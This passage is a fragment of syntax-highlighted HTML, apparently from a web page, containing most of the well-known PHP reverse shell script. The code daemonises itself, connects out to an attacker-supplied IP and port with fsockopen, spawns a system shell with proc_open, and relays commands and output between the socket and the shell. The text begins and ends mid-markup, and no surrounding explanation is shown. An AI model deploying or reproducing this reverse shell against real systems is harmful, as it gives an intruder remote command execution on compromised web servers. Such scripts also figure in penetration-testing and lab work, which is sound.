class=\"nx\"\u003epcntl_fork\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pid\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e  \u003cspan class=\"c1\"\u003e// Parent exits\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// Make the current process a session leader\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"c1\"\u003e// Will only succeed if we forked\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eposix_setsid\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003e$daemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;WARNING: Failed to daemonise.  This is quite common and not fatal.\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Change to a safe directory\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Remove any umask we inherited\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003eumask\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e//\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Do the reverse shell...\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e//\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Open reverse connection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efsockopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$port\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$errno\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$errstr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e30\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e$errstr\u003c/span\u003e\u003cspan class=\"s2\"\u003e (\u003c/span\u003e\u003cspan class=\"si\"\u003e$errno\u003c/span\u003e\u003cspan class=\"s2\"\u003e)\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Spawn shell process\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003e$descriptorspec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pipe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e  \u003cspan class=\"c1\"\u003e// stdin is a pipe that the child will read from\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e   \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pipe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e  \u003cspan class=\"c1\"\u003e// stdout is a pipe that the child will write to\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e   \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pipe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \u003cspan class=\"c1\"\u003e// stderr is a pipe that the child will write to\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$process\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eproc_open\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$shell\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$descriptorspec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003eis_resource\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$process\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Set everything to non-blocking\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Successfully opened reverse shell to \u003c/span\u003e\u003cspan class=\"si\"\u003e$ip\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"si\"\u003e$port\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// Check for end of TCP connection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Shell connection terminated\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// Check for end of STDOUT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Shell process terminated\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// Wait until a command is end down $sock, or some\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"c1\"\u003e// command output is available on STDOUT or STDERR\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003e$num_changed_sockets\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003estream_select\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$write_a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$error_a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// If we can read from the TCP socket, send\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"c1\"\u003e// data to process\u0026#39;s STDIN\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ein_array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;SOCK READ\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003e$input\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan 